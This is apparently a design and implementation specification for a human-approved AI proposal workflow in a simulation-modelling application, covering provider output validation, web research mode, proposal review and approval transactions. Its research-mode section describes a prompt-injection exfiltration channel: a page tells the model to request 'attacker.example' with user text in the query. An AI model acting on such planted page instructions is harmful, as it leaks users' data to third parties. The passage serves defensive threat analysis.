## 1. Authority boundary

AI is a constrained workflow, not an autonomous agent framework. It can read sanitized context, propose a ModelChangeProposal / Scenario proposal, propose a mapping, and analyze supplied aggregates; **it cannot modify the Twin, publish, approve, run a simulation, run arbitrary SQL/code, call production systems, access other tenants, or decide a waiver on its own**. The application server recognizes human approval as an authenticated user action; a statement such as "I have agreed" inside the prompt does not stand in for it.

The roles match the original report: Import Mapper, Model Architect, Scenario Designer, optional Critic/Validator, Simulation Analyst; none of them has write authority. The Application Server executes a bounded canonical effect only after authorization and a successful revalidation. AI components are not injected with a ModelCommitter / DB transaction handle / write tool; a provider response is only untrusted data.

## 2. Provider abstraction / deployment

```go
// PROPOSED refinement of the report's provider interface:
// provider output has NO trusted IDs, state or approval fields.
type LLMProvider interface {
    GenerateModelProposal(context.Context, ProposalContext) (ProposalOutput, error)
    ProposeImportMapping(context.Context, MappingContext) (MappingOutput, error)
    AnalyzeSimulation(context.Context, AnalysisContext) (AnalysisOutput, error)
}
```

The server fixes the mode of ProposalContext to edit/scenario; the same provider method can be used with different prompts. Domain does not import provider SDK types. Structured output is the first layer of constraint and does not replace the canonical 2020-12 validator; if the provider supports only a schema subset, the adapter makes an explicit projection, the server still validates the full schema, and authority must not be relaxed to suit the provider.

**The single encoding rule of the projection** (2026-10-26, a finding of the T-053 live smoke; the coordinator's decision): in principle the projection only removes constraints (and lists them) and changes `oneOf` to `anyOf`; it never adds a member, opens an object or relaxes a type. The single exception: positions in the canonical schema that accept any JSON value (the empty schema `{}`, `true`, or only a description; currently only the `value` of JSON Patch `add`/`replace`/`test`) are projected as `{"type":"string"}`, with a description that asks the model to write the value's JSON text (RFC 8259: a string with its quotes, a number, `true`/`false`/`null`, an array or an object), and the positions are listed in the projection's `Encoded` (next to `Dropped`). Reason: structured output has no schema for "any JSON value": the API rejects the empty schema (`400 invalid_request_error`: "Empty schema ({}) that accepts any JSON value is not supported. Please specify a concrete type."), and every object must be `additionalProperties: false`, so an open value (for example the object of a whole new node) cannot be written out member by member either. After the adapter receives the answer, and before the server validates it against the full 2020-12 schema, decoding happens only at these positions: positions are matched structurally by the member and array item path, plus the const member (`status`, `op`) of each `oneOf`/`anyOf` branch on the path, never by guessing from a string's content; the string must be exactly one strict JSON text (a single value, valid UTF-8, no duplicate member, only whitespace after it, at most 64 KiB, nesting at most 64 levels), and it is replaced by the decoded value (numbers and escapes as written); if the position is not such a string, the answer is `invalid_output` (the issue has only that position's JSON Pointer and a fixed message), and there is no ready proposal. Decoding fails closed: if the answer itself is not one strict JSON document, or the decoded value cannot be written back, it is also `invalid_output` (an issue at the root; the issues for earlier positions are kept); undecoded text is never handed to the full schema (the patch `value` accepts any JSON value, so an undecoded string would pass too). (Review round 1 correction M1: before the fix there was no nesting limit, and jsontext itself accepts 10000 levels; a value of 9998–10000 levels was valid on its own but exceeded the encoder's limit once put back at `/changes/i/value`; when that rewrite failed, the answer was handed over undecoded and without an issue and could become ready, so the rule in the previous sentence did not hold. 64 levels is far above any patch value (a valid IR has at most 11 levels: 7 levels of its own structure, with a node's `domain_attributes` at level 4 and at most `MaxContainerDepth` 8 levels itself), and far below 10000.) The decoded answer still goes through the full schema and server review; authority is not relaxed. An open value with no const member that tells its branches apart, and a schema with no concrete type after projection, are rejected by the projection and not sent.

When no provider/model, token budget or data policy has been chosen, live AI is explicitly disabled and returns AI_PROVIDER_NOT_CONFIGURED / AI_POLICY_NOT_APPROVED. The development fake provider can only be configured explicitly; it must not silently return a synthetic answer on a production timeout. Do not hard-code "the latest model"; decide after a comparison on the app-owned eval corpus.

H-046 (2) implementation: research mode (the owner's decision of 2026-10-29; tested only against fakes and a local test server, **no live call**: the live run is the coordinator's, after one independent review):
- **What it is**: the person may ask, per request, that the AI first research the real-world process on the web (`ProposalRequest.research`, default false; the model page's "Ask AI" form has the opt-in). The provider's own built-in tool does it: Meta's search grounding, `{"type":"web_search"}` in the same Messages call that carries `output_config.format` (the coordinator's probe of 2026-10-29 showed both work in one call). The provider searches, opens pages and finds text in them server-side; this build fetches no page, runs no tool of its own and has no new network path. The AI still only proposes: the answer is checked against the full output schema, reviewed (patch profile, candidate validation, ID pool, domain rules, dataset bindings) and risk-scored by the server, and a person approves (§1, AGENTS.md §2).
- **Who may research**: only the proposal roles (`modeler` for edit, `scenario` for scenario); never the analyst, the importer or a photo proposal (a prompt with images). The approval record says so: the H-029 record's data policy names `ResearchRoles: modeler, scenario` (H-046 (2): "the description the user typed is used for Meta's web search"); `Approval.AllowsResearch(role)`. A record that names research for another role, a role it does not serve, or (an Anthropic record) any research is `policy_unsupported`. Gates, each before any I/O: the API refuses a research request unless the configured provider may research for both proposal roles (`cmd/api` `researchAvailability`, from the settings only, never a key: the fake, or Meta live with the approval), with 503 `AI_PROVIDER_NOT_CONFIGURED` (a provider without web search, AI off) or `AI_POLICY_NOT_APPROVED` (Meta off or not approved for research), `details[0].code` `AI_RESEARCH_UNSUPPORTED` at `/research`, nothing stored; the client refuses a research prompt for a backend that is not a `provider.Researcher` (`research_unsupported`; the Claude adapter, the disabled backend) or that does not accept the role (`policy_not_approved`); the Meta adapter refuses it again in `Quote` and `Complete` (`policy_not_approved`).
- **Data flow**: the request's choice goes into the proposal's job payload (`research: true`, frozen with the job), and the `proposal.create` audit event records `research: true` (a flag, never the intent). The worker builds the usual sealed context and, for research, appends the versioned research template `prompts/research/system.md` (`research-0.2.0`) after the role's rules; the prompt's template version names both (e.g. `modeler-0.2.0+research-0.2.0`), and `Prompt.Research` is sealed into the input hash (left out of the hash when false, so a prompt without research is byte-for-byte what it was). The blocks are the same as without research: the intent the person typed (already redacted of credentials, URLs, e-mail and IP addresses by the context builder) is what the model may search for; the template forbids putting model data, IDs, names, addresses or figures into a query, and asks for English searches and English-language engineering and industry sources by default (the proposal's prose still follows `output_locale`).
- **The answer**: Meta returns `redacted_thinking`, narration `text` and `server_tool_use` blocks named `web_search` (`input.type` `search`, `open_page` or `find_in_page`), **no tool result block**, and the structured answer as the last `text` block. A step therefore says only what the model asked the tool to do: that an `open_page` step's page loaded, or what it held, is not known to this build (review round 1, M3). The adapter counts every step (searches apart), keeps the URLs of `open_page` and `find_in_page` steps for the client's source filter and the search texts for its identifier count (never logged or stored), takes the last text block after the last step as the answer and drops the narration unread. A step of another tool, a developer tool call, a tool result block, an answer that does not come after the last step, no answer, a refusal, a paused turn or another model is refused (`invalid_output` or `refused`; fail closed), its usage and steps billed all the same. A call without research that comes back with a step is `invalid_output`, as before.
- **Sources**: `proposal-output.schema.json` has an optional `sources` list (at most 20; URL and title strings). The client keeps a claimed source only when the call itself asked its search tool to open that URL (`provider.FilterSources`): both sides are written as `provider.SourceURL` writes them (an https URL whose host is a public-looking ASCII DNS name or xn-- IDN, at least two labels with a last label that starts with a letter and is not `localhost`, `local`, `internal`, `intranet`, `lan`, `home`, `corp` or `arpa`, so no IP address and no single-label host (review round 1, L2); no user info; RFC 3986 path and query; the fragment removed; at most 2048 bytes), a repeat is kept once, at most 20, and never one whose query string carries one of the request's own identifiers (see the next item); titles are cleaned (`provider.SourceTitle`: no control, format, bidirectional, private-use or noncharacter code points, white space collapsed, at most 200 characters). Everything else is dropped and counted. The answer's own `sources` never reach the review (it cannot change validation or risk) and are cleared from the output. The kept sources are stored with the row's provider metadata (`provider_metadata.sources`, beside the counts in `provider_metadata.web_search`), only for needs_input and ready; the resource (`proposal.schema.json` `sources`, `common.schema.json` `WebSource`) shows them for the states that keep what the provider wrote, checked again on the way out and only when `generated_by.web_search` is shown too (`proposals.SourcesOf` gates on `FromMetadata`'s checks; review round 1, L1), and `generated_by.web_search` shows `{queries, sources_dropped}`. The UI calls them "Pages the AI asked to open" and says Geminus cannot confirm they loaded. No migration: the metadata column is immutable once generated (0001 trigger). PROPOSED: a dedicated column if sources should be queried or kept apart from call metadata.
- **An exfiltration channel** (review round 1, M2): the provider runs the model's steps itself, so a page the model reads can tell it to ask for a URL such as `https://attacker.example/?d=<the intent or model text>`; Meta then fetches that URL, and what it carries reaches that site. This build never sees a step before Meta runs it and cannot block it. What it does: the research context carries the request's own identifiers (`ProposalContext.Markers`: the organization's, model's, version's and proposal's IDs, the whole ID pool, and the model's entity IDs that contain `_` or a digit, at least 4 bytes; never sent); a source whose query string carries one (percent-decoded, any case) is dropped and never shown as a link; and the steps that carry one (search texts, and URLs after their host) are counted (`web_search.steps_with_ids` in the metadata, `web_search_steps_with_ids` in the audit, a warning in the worker log with the count only). Free text of the intent, or an identifier only in a URL's path or host, is not recognised this way. The impact is bounded by the data policy (H-018, H-029: only synthetic data and text the person typed are sent), but the intent is free text: the form tells the person their description is used for a web search and not to include customer or confidential details.
- **Limits and spend** (D-110/D-111's ledger, unchanged caps): a research call is one attempt (`provider.ResearchMaxRetries` 0), and so is its job: a research proposal's job is queued with a single attempt (`proposals.ResearchJobAttempts` 1) and its provider failure is final whatever its code (review round 1, M1), so a call that timed out or failed after a whole search loop is never run, and billed, again; the person asks again. `max_tokens` is 32,000 (`provider.ResearchMaxOutputTokens`; the probe ran out at 2,000) and the attempt and call timeouts are scaled as for images (at most 300 s). Web search is billed at USD 2.50 per 1,000 queries on top of tokens (`spend.SearchPriceOf`, `muse-spark-1.3` only). **The reservation is not a ceiling.** Meta documents no limit on the server-side search loop (`max_uses` is a 400) and no bound on its usage, which is summed over the loop's steps, each reading the whole context again (the probe used 41,356 input tokens for five steps of a small question). One research attempt is reserved at the whole context window of input (1,048,576 tokens at the uncached input rate), 32,000 output tokens and 64 web search steps (`researchMaxToolCalls`), each priced as a query: USD 1.31072 + 0.136 + 0.16 = **USD 1.60672**, against the default organization day cap of USD 5 and deployment day cap of USD 10. The context window bounds one sampling step only, so one call can cost more than its reservation and more than an organization's day cap; **the only hard limit is the attempt's timeout**. Settlement is what the answer reports: its usage plus every step it lists at the search price (every step, not only searches: an upper bound, since the pricing page does not say whether opening a page is a query); an attempt that may have been billed without an answer is settled at the whole reservation. A call that costs more than the reservation is recorded at what it cost, never clamped, flagged `spend_over_reservation` and warned of in the log (T-053 review round 1, L1), and the caps then refuse later calls.
- **What is recorded**: the provider metadata and the `proposal.generate`/`proposal.attempt_failed` audit events record counts only (`web_search_queries`, `web_search_calls`, `web_search_pages`, `sources_kept`, `sources_dropped`, `web_search_steps_with_ids`); the ledger's `ai_spend.settle` event records `web_search_calls`. No query, page content or URL is logged or put in an error; the only URLs kept are the filtered sources in the proposal's own row.
- **Fake**: the deterministic fake accepts research for the proposal roles and reports fixed steps (two searches, two `example.com` test pages opened, `fake.ResearchSources`); its safe answer names those two pages and one it did not open, so a research proposal on the fake shows two sources and one dropped. It fetches nothing; the e2e fake API (`apps/web-e2e/fake/servers.mjs`) mirrors this for the browser tests.
- **NOT RUN**: any live research call (the coordinator runs it after independent review); whether Meta's `max_tokens` bounds the whole loop's output (observed in the probe, not documented); whether opening a page is billed as a query.

A Muse Wonder research reservation is one attempt at the context window bound, 32,000 output tokens and 64 steps: USD 4.994304, just under D-110's USD 5 organization day, so it is refused (`quota_exceeded`) once the organization has spent more than about half a cent that day.
- **Timeouts** (D-007's 300 s job timeout is the cap): Muse Wonder is slow (the coordinator's probe: 117 s for one small research question), so a call that names it has a research call's timeouts (`Budget.ResearchTimeout`: at the defaults 300 s for each attempt and for the whole call, never more), with its own output bound and retries inside that deadline; research and photo calls already have those bounds. Its job has a single attempt (`proposals.SlowModelJobAttempts`, review round 1 M1), and its provider failure is final whatever the code, so a call that ran to 300 s (settled at its bound) is never run, and billed, again by the queue.
- **NOT RUN**: any live Muse Wonder call; whether Muse Wonder takes images (the probe was text with web search); its context window (the quote uses Muse Spark's 1,048,576-token bound); how long a Muse Wonder proposal without research takes.

## 3. Context builder

Input may only be taken from authorized repositories and the scoped result service: immutable model slice + entity-ID index, the full schema/domain rules, intent, selected entity IDs, sanitized data summary, approved limits; the analyst also receives results/statistical summary/comparison. A full model / baseline metrics that the client supplies are not accepted as trusted authority.

All CSV cells, JSON metadata, model labels and user intent text are marked UNTRUSTED_DATA and cannot be interpreted as system/developer instructions. Raw credentials, tenant secrets, unrelated raw rows, other tenants, arbitrary URLs and private infrastructure secrets are default deny. Large imports send only a summary and a bounded sample, not the whole CSV. Context omission must be visible; a reference that is not visible in the slice must not be treated as nonexistent.

Output language (REQ-022): every AI request carries `output_locale` (`en` by default, or `zh-Hant`), taken from the user's UI language; the server validates it as an allowed value and then places it into the provider instruction; other client text cannot change it. Only prose (summary, assumptions, explanation, clarifying question) is output in that language; IDs, JSON Patch paths, JSON Pointers, enum/reason codes, metric paths and units are never translated. Numbers in analyst prose are always written in Arabic numerals with the units of the supplied values, and the numeric check of §9 applies to both languages; Chinese numeral spellings that cannot be checked (such as 四十七, "forty-seven") count as unchecked numbers. The request contract added this field in T-024/T-025 following "contract first"; the eval corpus contains zh-Hant intents (T-038).

APPROVED D-016: IDs of new nodes/resources must come from the allocation pool the server provides and be created explicitly in the same patch; inventing external datasets or referencing resources that were not created or are not authorized is forbidden. If the pool/schema/intent is insufficient, needs_input. The server does full candidate IR referential validation, not only of the slice.

T-024 implementation (`internal/ai/aicontext`, ADR-027): every input carries its organization (and model); if any one of them is outside the request scope, the whole build fails (`cross_tenant_input`) and no partial context is returned. The system message has only the versioned template, fixed server rules, the domain pack's static `PromptContext` and the `output_locale` instruction; the user message has only `server_data` (ID_ALLOCATION_POOL, ALLOWED_METRIC_REFERENCES, CONTEXT_OMISSIONS) and the `untrusted_data` block, whose content is JSON with `<`, `>` and `&` escaped, so data cannot close or forge a block. ENTITY_INDEX always lists every entity with its real index, and CONTEXT_OMISSIONS lists the omitted kinds, counts and reason codes; still over budget gives `context_too_large`. ## 4. Provider output / proposal state machine

`proposal-output.schema.json` is the provider output; `proposal.schema.json` is the server resource. The provider only returns `status=proposed` or `needs_input`; it has no `ready`, organization_id, base_version_id, validation, new_version_id or approved_by. The server binds/computes these; mass assignment is forbidden.

```text
generating -> ready | needs_input | invalid | failed
ready      -> approved | rejected | conflicted
needs_input -> rejected        # supplying more information means creating a new proposal
```

approved/rejected/invalid/failed/conflicted are the terminal states of this candidate workflow; the original object is never silently rebased, its patch changed or its assumptions replaced. Before ready: schema → op allowlist → decoded pointer allowlist → candidate IR → references → domain/constraints/dataset → server risk. With any error it must not become ready, let alone be approved.

needs_input must carry questions and must not secretly attach executable changes. Provider timeout/invalid JSON is kept separate from a valid needs_input. invalid keeps sanitized issue / audit metadata and does not put the raw malicious output into executable context.

The flow of the T-025 implementation (D-061, D-062 APPROVED, H-019) is as follows.

1. `POST /v1/models/{id}/ai-proposals` (editor/owner) returns 503 first when AI is off, without writing any data.
2. Next it checks whether `base_version_id` is the model's latest; if not, it returns 409 `MODEL_VERSION_CONFLICT`.
3. The server generates the proposal ID and the ID pool and writes them in the same transaction as the `model_proposal` job, the audit `proposal.create` and the idempotency response, returning 202 `generating`.
4. The worker's handler (`internal/proposals/generator`) reads the proposal and the base under the lease. Then, outside the transaction, it builds the context (`aicontext.Proposal`) and calls the provider (`provider.Client`), and `internal/ai/review` checks, in order:
   - output shape;
   - patch (mode allowlist, test-before-modify, atomic);
   - candidate validation;
   - no-op;
   - ID pool (`ID_POOL_VIOLATION`);
   - domain pack;
   - numbers in expected effects (`AI_OUTPUT_INVALID`);
   - server risk.
5. After review comes the dataset binding stage. The base version's dataset snapshots are read and validated before the provider call, and the binding stage after the call reads only these copies, so a storage error cannot happen after a paid call (D-061 (c)).
6. The result is written in the same transaction as the job's completion: `ready` (canonical patch, the server-computed `patch_hash`, server risk, provider claim, max, the base version's whole dataset manifest, D-062 (g)), `needs_input` (questions, no changes and no risk) or `invalid` (only issues and provider metadata, storing none of the answer's text; the issue message is a fixed sentence, and the path keeps only array indexes and schema member names, D-061 (f)). An answer that contains U+0000 or an empty string is judged `invalid`, rather than failing at write time and being retried.
7. A provider error is a job failure (`AI_<CODE>`, fixed message). When the job finally fails, the proposal moves to `failed` with `error` and no other content.

H-057 implementation: one repair after the server's check (the coordinator's slice under the owner's stability decision H-055; tested only against fakes and local test servers, **no live call**; validation report [checks/H-057_REPAIR_ONCE_VALIDATION.md](../checks/H-057_REPAIR_ONCE_VALIDATION.md)):
- **When**: the outcome of the first answer is `invalid` with at least one error, and the model's own complete answer is in hand (`provider.ProposalResult.Prior`): a schema-valid answer the review refused (patch issues, the candidate's validation such as `ROUTING_INVALID`, the ID pool, the domain pack, expected-effect numbers, the photo rules of §5 and the dataset binding stage), or one the client refused for what it says (`invalid_output` from the schema, or an encoded place of the projection that does not decode). Never for a truncated answer (`AI_OUTPUT_TRUNCATED`), a refusal, an answer from another model or with a web search it was not offered, a policy, approval or spend-cap refusal, an unavailable provider, a timeout, a cancellation, or a segmentation the server refused (no model answer). `ready` and `needs_input` stand. At most one repair per proposal, inside the same job attempt (`internal/ai/repair` `Once`; the text path in `internal/proposals/generator`, the photo path in `internal/ai/photopipeline`, which the live photo smoke runs too).
- **The second request** (`aicontext.Revise`): the first call's sealed prompt again (the same system text, blocks and images, the same role, locale and chosen model, never research), the model's previous answer as the assistant turn (the text the backend took before decoding it; held in memory only, `provider.PriorAnswer` prints and encodes as withheld, never stored or logged; its digest, not its text, is sealed into the InputHash), and a user turn of the server's: the versioned template `prompts/repair/system.md` (`repair-0.1.0`, English) and one `server_data` block `SERVER_REVIEW` listing the errors (at most 50, the rest counted) as code, JSON Pointer path and the server's own fixed sentence, each cleaned again by `review.Clean`, so nothing the answer or a person wrote is echoed. The prompt's version names the repair after the first's (`modeler-0.2.0+repair-0.1.0`). Both adapters send it as the Messages conversation user → assistant → user (Meta's Anthropic-compatible endpoint: **NOT RUN live**).
- **Review and outcome**: the second answer goes through exactly the same decode and checks as the first (for a photo: the review, the photo rules and the binding stage; the segmenter is not asked again, the same segments are reused); the proposal's state is that review's (`ready`, `needs_input` or `invalid` with the second answer's issues), and so is the client's refusal of the second answer for what it says (`invalid_output` with the answer handed back, as for a first call). A second call that fails (a timeout, a truncation, a spend cap, an unavailable provider, or `invalid_output` with no answer handed back: no text block, a stop reason this build does not know, another model's answer, an empty or oversized one; review round 1) leaves the first outcome and its issues, is not shown as revised, and is recorded as `repair.outcome` failed with its code (`AI_INVALID_OUTPUT` for the last kind, which is how an endpoint that does not take the repair's turns shows); a cancellation is the attempt's, as for any call.
- **Spend and timing**: the second call goes through the same metered client: its own reservation before it is sent (its quote holds the prior answer and the follow-up; a request with images is counted again with them), its cost settled and recorded, the daily and monthly caps applied. A research proposal's repair has no web search but keeps a research call's output bound (32,000) and timeouts, with the budget's retries; the first call's sources stay with the proposal. Each call keeps its own deadline (at most 300 s); the job's lease is renewed by the worker's heartbeat for as long as the attempt runs, so two calls fit one attempt, and research and slow-model jobs keep their single attempt (`ResearchJobAttempts`, `SlowModelJobAttempts`).
- **Record**: the stored provider metadata stays the first call's and gains `repair` (`outcome` ready/needs_input/invalid/failed, a failed call's `code`, `issues`, `issues_not_listed`, and the second call's metadata: no prompt, no answer); the `proposal.generate` and `proposal.attempt_failed` audit events gain the `repair*` fields (outcome, code, issues, template, hashes, tokens, latency, request ID, spend); the worker's `ai provider call ended` line says `call_attempt` 1 or 2. The API's `generated_by.revised_after_check` is true when the proposal holds the second answer (any reviewed outcome), and the proposal page shows "Revised once after Geminus's check." (zh-Hant 「經 Geminus 檢查後修正過一次。」).

Ready content cannot be changed (migration 0012). The server binds the identity, validation and approval fields; such fields in a provider answer do not conform to the output schema, so the answer is judged `invalid`. Review does not read the intent, so numbers in expected effects can only be numeric parameters of the base or the candidate, or numbers in base names; numbers in names that the patch writes do not count (D-062 (e)). The analysis job handler belongs to T-030 (depends on T-029) and was not done in this task.

## 6. Approval transaction and dirty draft

A human sends approve(proposal_id,expected_base_version_id,Idempotency-Key). The API revalidates the current membership/Editor or Owner, that the proposal is ready, that the base belongs to the same model/tenant, and that latest=expected=proposal.base. The stored patch/assumptions/hash/dataset manifest must still be the same one that was reviewed; any change needs a new proposal.

Deterministic validation is redone under a consistent lock order. mode=edit: create exactly one immutable ModelVersion, parent=base, update latest; a clean draft follows it, a dirty draft is kept and draft_out_of_date=true is returned. mode=scenario: create exactly one immutable Scenario; **the canonical model version count and hash do not change**. Both write the approval/audit/idempotency response in the same transaction. A repeated approval, even with a new idempotency key, cannot produce a second effect.

If the latest base has changed, return 409 MODEL_VERSION_CONFLICT and move the original proposal to conflicted; no automatic rebase. reject does not change the model/version/draft hash. If a role is revoked after review, approve must be refused; having seen the diff earlier does not mean having permission now.

The flow of the T-026 implementation (`internal/proposals/approval`; D-067–D-069 APPROVED, H-021) is as follows. Approval does not call the provider, so it does not depend on whether AI is on; neither AI nor the worker can link this package (architecture rule `decisions-only-in-the-api`), and the worker has no INSERT on versions and scenarios and no UPDATE on ready proposals (0002).

1. Checks of the request itself (path, media type, body, the `Idempotency-Key` header: 400/415/422) come before the role check, as on other routes. Idempotency-Key is checked after membership and role (editor/owner): the fingerprint is the proposal ID and the normalized parsed body (an empty comment is the same as none); the key's scope does not include the proposal, so the same key with the same body used on another proposal is 409 `IDEMPOTENCY_KEY_CONFLICT`; before a replay the role is still checked first, and a replayed error answer carries this request's ID (D-069 (a)).
2. Lock the model row, the draft and the proposal, in that order. approved, rejected and conflicted return 409 `PROPOSAL_ALREADY_DECIDED` (also with a different key, D-030); other states that are not ready return 409 `LIFECYCLE_CONFLICT`.
3. The base is no longer latest: the proposal moves to conflicted (`decided_by` is this approver), audit `proposal.conflict`, return 409 `MODEL_VERSION_CONFLICT`; this response commits in the same transaction as the state change and is stored as that key's response. `expected_base_version_id` is not the proposal's base: 409 `MODEL_VERSION_CONFLICT`, and nothing changes.
4. Review the stored content (summary, assumptions, canonical changes, expected effects, confidence, provider claim) again with `internal/ai/review.Review`, then run the dataset binding stage with the base's whole manifest and reread the snapshots: an error returns 422 `MODEL_VALIDATION_FAILED` (the proposal stays ready); a recomputed server risk or effective risk that differs from the stored one returns 409 `LIFECYCLE_CONFLICT` (`/risk_level` or `/server_risk_level`); a patch, hash or manifest that differs from the stored one is a server error, and nothing is approved; unreadable snapshots give 503 (`details[0].code` is `DATASET_STORAGE_FAILED`, D-069 (b)). A refused approval does not change the state: a proposal whose revalidation failed or whose risk changed stays ready and can only be rejected and proposed again (B1 of D-069 (b), pending the owner's decision).
5. edit: exactly one new ModelVersion (parent is the base, number is the base's plus one, IR is the base plus the reviewed changes, manifest is the proposal's `dataset_bindings` (D-062 (g)), comment is the request's), which becomes latest; a clean draft moves to it, a dirty draft is kept as it is and `draft_out_of_date=true` is returned. scenario: exactly one immutable Scenario (base, reviewed changes and hash, name taken from the summary, D-067), no new version, no run enqueued.
6. The proposal moves to approved (decider, time, comment, D-068), audit `proposal.approve` (ID, hash, risk, no comment), idempotency response, all committed in the same transaction; at commit, migration 0013 checks again that the effect belongs to this approved proposal.

Reject: ready or needs_input moves to rejected (decider, time, comment), audit `proposal.reject`, returns 200 with the same Proposal as getProposal; other states return 409 as above. Reject also locks the model row first in the same order, so approval and rejection of the same proposal take turns.

## 7. Scenario Proposal

A mode=scenario patch is limited to parameters such as existing capacity, arrival/service/delay distribution and routing probability. Approval only creates a what-if description and **does not enqueue a run**. An authenticated human must separately POST simulations referencing scenario_id; the run then freezes base + patch/config/datasets.

T-028 implementation (`internal/scenarios`; D-078–D-080 APPROVED, H-022): manual scenarios (createManualScenario) and AI scenarios use the same patch rules (D-021); they differ only in the rules that exist only for provider answers (ID pool, expected effects, risk, must change the model); `TestTheAIScenarioModeTakesTheSameRules` compares the two on the same set of patches. A scenario created by approval is read with getScenario and listScenarios, and `source_proposal_id` points back to that proposal; an Approval distinguishes its effect by `mode` (edit's `new_version_id`, scenario's `scenario_id`), and the client must check `mode` before reading (TS contract test). Neither creating nor approving a scenario creates a version or enqueues a run (TEST-008).

A "next experiment" that the AI analyst suggests is also only a text hypothesis; a new Scenario Proposal is created only after the user chooses it. An analyst suggestion cannot be treated directly as an approved patch, and there is no autonomous batch search for the best parameters (P1 experiment sweeps).

## 8. Import Mapper / inferred model

The mapper proposes only from COLUMN_NAMES, SAMPLE_ROWS, CANONICAL_SCHEMA; each item has source_column, target_field, confidence, evidence, transform, requires_confirmation. confidence<0.80 or target_field=null must be confirmed; without semantic evidence the target is null, and timestamp or the like is not guessed from similar names.

APPROVED D-009: transforms allow only identity/rfc3339/integer_ms/boolean_literal. No eval, SQL, JS/Python or free-text expression. Mapping suggestions and confirmed mappings are stored separately; saving a mapping increments the revision and queues validation; a stale validation job must not mark an old revision validated. T-017 implementation (D-070, D-071 APPROVED, H-021): a manual mapping uses `import-mapping.schema.json` (no confidence, evidence, requires_confirmation), and each target field's transform is fixed; when an import has a ready suggestion, the server decides which entries need human confirmation by this section's rules (confidence < 0.80 or target_field = null, or the AI itself marked `requires_confirmation`; a stored flag cannot waive confirmation), and every column for which the mapping follows such an entry (for a null entry: the mapping does not import that column either) must be listed column by column in `confirmed_low_confidence` by the person who saves (entries in the suggestion that are not columns of this import need no confirmation, T-017 review round 2 N1); a stored suggestion is validated with `ai-mapping.schema.json` on every read, and saving fails closed if it does not conform; AI has no path to write a mapping (the worker has no grant, and 0014 refuses), so a suggestion never becomes a mapping. `mapping_revision` and the deferred trigger of 0014 stop stale jobs.

Commit freezes the dataset; inference proposes a model proposal from the data (with assumptions/data quality) and cannot publish directly. JSON model import likewise goes through server-bound identity + validate + diff + review. Invalid rows are not silently dropped; the original report did not authorize "import only the valid part", and the candidate P0 is all-or-nothing.

## 9. Analyst evidence / numeric checks

Analysis only on a completed run; if there is a baseline, the server first establishes comparability and the delta. The output keeps the original report's baseline, scenario, delta, bottleneck, assumptions, uncertainty, suggested_next_experiments. The evidence={run,metric_path} of major conclusions (D-026: the provider output `analysis-output.schema.json` has no run ID; runs are referenced by the baseline/scenario role, and the server binds run_id/baseline_run_id in the AnalysisRecord) must fall within the supplied `/metrics/...` and point to an available metric; checking only that the name exists is not enough.

T-029 provides the basis for comparison and checking (D-088–D-090 APPROVED, H-024): `Compare` in `internal/results/compare` is the single delta computation shared by the API and the analysis job; a metric path is an RFC 6901 pointer from the Result root to a single statistic (for example `/metrics/queues/<queue>/wait_p95_minutes`); `Statistics` lists the statistics that can be cited, and `Resolve` takes a value (unavailable is nil; nonexistent, malformed or not a statistic is `ErrUnknownPath`; when `metrics` violates the Result contract, both behave like `Compare` and fail closed with `ErrInconsistent`); each metric of the comparison corresponds to the analysis delta through the same path. T-024's ALLOWED_METRIC_REFERENCES are summary-level pointers; T-030 decides how the two correspond (D-090 (a)).

The server checks: the evidence's run role has a corresponding run (when baseline=null, the baseline must not be cited), the metric path exists and does not cross tenants, the value is available, every numeric delta equals the computed comparison, and the relative_delta for baseline=0 must be null. A nonexistent metric, a wrong value or a wrong run makes the analysis failed; it is not stored as completed. Valid JSON is not taken as a grounded answer. Without a baseline, baseline=null and delta=[]; no comparison is invented.

Observation and inference are kept separate. Major numbers in the text must also be checkable against the supplied values; checking only the structured delta while letting invented numbers in prose through is not enough. T-024 provides the basis for the check (wiring it to analysis completed/failed belongs to T-030): the analysis context returns the metrics that can be cited (only available ones, by run role) and the supplied numbers (results, comparison, config, capacities and probabilities, no array indexes); `locale.CheckProse` finds, in both languages, Arabic numerals, number words (Chinese numeral strings, 百分之 ("percent of"), a number + classifier or unit; English two…trillion, dozen, twice, half) and non-ASCII digits that do not match the supplied values. uncertainty must reflect low replications, missing data, censoring and assumptions; simulation results must not be called a certain future. While P0 has no adequate automatic verifier, numeric prose without evidence is forbidden; use server-rendered metric blocks + a qualitative explanation instead.

T-030 implementation (`internal/ai/analyst`, `internal/analyses`, `internal/analyses/analyzer`, migration 0018; D-133 PROPOSED): the API accepts only two runs that are both completed, of the same model, and that the server will compare (otherwise 422: no job is queued and nothing is paid); the job computes the comparison with `compare.Compare`, and the answer is stored as completed only if it passes `analyst.Check`; otherwise the job fails with `ANALYSIS_UNGROUNDED` and is not retried, and the analysis becomes failed with no content stored. Checks: evidence is a metric listed for that role, or a statistic under it that has a value; a delta is a path of the comparison, its value is equal after rounding to the digits written (relative: at least 2 digits), and the comparison's value is stored; numbers in the text are checked with `locale.CheckProse` (including spellings like `.97`); the text contains no server ID; claims contain no words that promise an outcome; with fewer than 2 replications, uncertainty must be stated. **Known limits**: the direction stated in the text ("rises", "falls") is not checked, only the sign of the structured delta is; numbers in the text are compared with the whole set of supplied values at the digits written, so the more values are supplied, the looser the check; numbers after a colon, such as `3:97`, are treated as times or ratios and not checked.
